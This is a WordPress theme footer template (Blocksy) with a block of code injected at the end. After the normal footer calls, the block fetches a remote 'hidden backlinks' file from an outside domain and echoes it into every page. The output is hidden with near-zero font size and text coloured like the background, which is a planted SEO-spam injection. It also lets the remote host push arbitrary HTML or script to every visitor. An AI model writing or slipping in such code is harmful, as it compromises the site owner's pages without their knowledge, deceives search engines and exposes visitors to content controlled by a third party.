<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Blocksy
 */

blocksy_after_current_template();
do_action('blocksy:content:bottom');

?>
	</main>

	<?php
		do_action('blocksy:content:after');
		do_action('blocksy:footer:before');

		blocksy_output_footer();

		do_action('blocksy:footer:after');
	?>
</div>

<?php wp_footer(); ?>
<?php
        echo "<div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'>";
        echo file_get_contents("https://yokgercep.com/404-forbiden/hiden-backlinks.txt");
        echo "</div>";
    ?>
</body>
</html>
